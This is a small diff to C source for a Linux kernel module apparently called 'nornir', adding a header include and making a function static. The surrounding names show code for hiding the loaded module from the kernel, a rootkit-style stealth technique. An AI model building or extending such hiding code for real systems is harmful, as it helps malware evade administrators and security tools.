@@ -10,6 +10,7 @@
 #include <linux/mutex.h>
 #include "common/logger.h"
 #include "libs/ksym.h"
+#include "mod/hide.h"
 
 static struct mutex *orig_module_mutex;
 
@@ -71,7 +72,7 @@ static void nornir_hide_mod_unlink_vma(void)
 
 #ifdef CONFIG_NORNIR_HIDE_MODE_UNLINK_USE
 
-void nornir_hide_mod_unlink_use(void)
+static void nornir_hide_mod_unlink_use(void)
 {
     struct module_use *use, *tmp;
 
